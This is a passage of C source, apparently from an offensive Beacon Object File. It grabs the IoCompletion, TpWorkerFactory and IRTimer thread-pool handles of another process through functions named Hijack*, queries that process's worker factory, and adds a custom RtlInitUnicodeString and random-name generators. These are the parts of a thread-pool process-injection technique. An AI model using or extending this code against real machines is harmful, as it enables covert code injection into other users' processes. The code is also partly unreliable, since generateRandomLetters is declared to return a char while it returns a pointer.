    return hTargetThreadPoolHandle;
}

void HijackIoCompletionHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
    hIoCompletion = GetTargetThreadPoolHandle((PWSTR)L"IoCompletion\0", processHandle, dwDesiredAccess);
}

void HijackTpWorkerFactoryHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
    hTpWorkerFactory = GetTargetThreadPoolHandle((PWSTR)L"TpWorkerFactory\0", processHandle, dwDesiredAccess);
}

void HijackIRTimerHandle(HANDLE processHandle, DWORD dwDesiredAccess) {
    hIRTimer = GetTargetThreadPoolHandle((PWSTR)L"IRTimer\0", processHandle, dwDesiredAccess);
}

WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation() {
    WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
    _NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationWorkerFactory"));
    NtQueryInformationWorkerFactory(hTpWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
    return WorkerFactoryInformation;
}

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    if (!DestinationString) return;

    if (!SourceString) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = NULL;
        return;
    }

    /* Compute character length, then clamp so (len+1)*sizeof(WCHAR) fits in USHORT */
    size_t cch = MSVCRT$wcslen(SourceString);

    /* Max WCHAR count that allows room for the NUL in USHORT bytes */
    size_t max_cch_with_nul = (USHRT_MAX / sizeof(wchar_t));
    if (max_cch_with_nul > 0) {
        size_t max_cch = max_cch_with_nul - 1; /* leave space for the terminator */
        if (cch > max_cch) cch = max_cch;
    }

    /* Set fields (Length/MaximumLength are in BYTES) */
    DestinationString->Length = (unsigned short)(cch * sizeof(wchar_t));
    DestinationString->MaximumLength = (unsigned short)((cch + 1) * sizeof(wchar_t));

    /* Official RtlInitUnicodeString stores the caller's pointer (no copy). */
    DestinationString->Buffer = (PWSTR)SourceString; /* cast matches real API */
}

char generateRandomLetter() {
    int randomNumber = MSVCRT$rand() % 26;
    char randomLetter = 'A' + randomNumber;
    return randomLetter;
}

char generateRandomLetters(int length) {
    char* randomLetters = (char*)MSVCRT$malloc((length + 1) * sizeof(char));
    for (int i = 0; i < length; ++i) {
        randomLetters[i] = generateRandomLetter();
    }
    randomLetters[length] = '\0';
    return randomLetters;
}

wchar_t generateRandomLetterW() {
    return L'A' + MSVCRT$rand() % 26;
}

wchar_t* generateRandomLettersW(int length) {
    wchar_t* randomLetters = (wchar_t*)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
    for (int i = 0; i < length; ++i) {
        randomLetters[i] = generateRandomLetterW();
    }
    randomLetters[length] = L'\0';
    return randomLetters;
}

// ----------------------------------------------------------------------------------------------------
